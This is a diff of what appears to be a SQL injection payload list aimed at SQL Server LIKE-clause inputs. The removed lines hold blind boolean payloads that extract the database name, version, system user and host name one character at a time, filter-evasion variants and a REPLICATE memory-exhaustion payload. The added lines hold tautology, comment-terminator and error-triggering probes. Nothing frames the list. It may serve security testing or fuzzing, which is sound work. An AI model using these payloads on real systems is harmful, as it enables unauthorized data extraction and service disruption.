@@ -1,27 +1,22 @@
-%' AND LEN(DB_NAME())>0 AND 'a'='a
-%' AND LEN(@@VERSION)>0 AND 'a'='a
-%' AND LEN(SYSTEM_USER)>0 AND 'a'='a
-%' AND LEN(USER_NAME())>0 AND 'a'='a
-%' AND LEN(HOST_NAME())>0 AND 'a'='a
-%' AND LEN(DB_NAME())=1 AND 'a'='a
-%' AND LEN(DB_NAME())=2 AND 'a'='a
-%' AND LEN(DB_NAME())=3 AND 'a'='a
-%' AND LEN(DB_NAME())=4 AND 'a'='a
-%' AND LEN(DB_NAME())=5 AND 'a'='a
-%' AND LEN(DB_NAME())=6 AND 'a'='a
-%' AND LEN(DB_NAME())=7 AND 'a'='a
-%' AND LEN(DB_NAME())=8 AND 'a'='a
-%' AND SUBSTRING(DB_NAME(),1,1)='a' AND 'a'='a
-%' AND SUBSTRING(DB_NAME(),1,1)='b' AND 'a'='a
-%' AND SUBSTRING(DB_NAME(),1,1)='c' AND 'a'='a
-%' AND ASCII(SUBSTRING(DB_NAME(),1,1))>77 AND 'a'='a
-%' AND ASCII(SUBSTRING(DB_NAME(),1,1))>90 AND 'a'='a
-%' AND ASCII(SUBSTRING(DB_NAME(),1,1))>100 AND 'a'='a
-%' AND LEFT(DB_NAME(),1)='m' AND 'a'='a
-%' AND RIGHT(DB_NAME(),1)='b' AND 'a'='a
-%' AND CHARINDEX('m',DB_NAME())=1 AND 'a'='a
-%' AnD LeN(Db_NaMe())>0 AnD 'a'='a
-%' AND LEN(DB/**/NAME())>0 AND 'a'='a
- %'AND LEN(DB_NAME())>0 AND'a'='a
-  %' AND LEN(	DB_NAME())>0 AND 'a'='a
-%' AND LEN(REPLICATE('A',5000000))>0 AND 'a'='a
+%' AND LEN('a')=1 AND 'a'='a
+%' AND DATALENGTH('a')=1 AND 'a'='a
+%' AND CHARINDEX('a','abc')=1 AND 'a'='a
+%' AND PATINDEX('%a%','abc')=1 AND 'a'='a
+%' AND LEFT('abc',1)='a' AND 'a'='a
+%' AND RIGHT('abc',1)='c' AND 'a'='a
+%' AND SUBSTRING('abc',1,1)='a' AND 'a'='a
+%' AND ASCII('a')=97 AND 'a'='a
+%' AND UNICODE('a')=97 AND 'a'='a
+%' AND LOWER('A')='a' AND 'a'='a
+%' AND UPPER('a')='A' AND 'a'='a
+%' AND (1)=1 AND 'a'='a
+%' AND (SELECT 1)=1 AND 'a'='a
+%' OR 1=1-- 
+%' OR 1=1-- -
+%' OR 1=1#
+%' OR 1=1/*
+%' OR 1=1 AND 'a'='a
+%' AND 1=1 AND '1'='1
+%' AND 1=2 AND '1'='1
+%' AND 1 IN (1) AND 'a'='a
+%' AND 1/0=1 AND 'a'='a
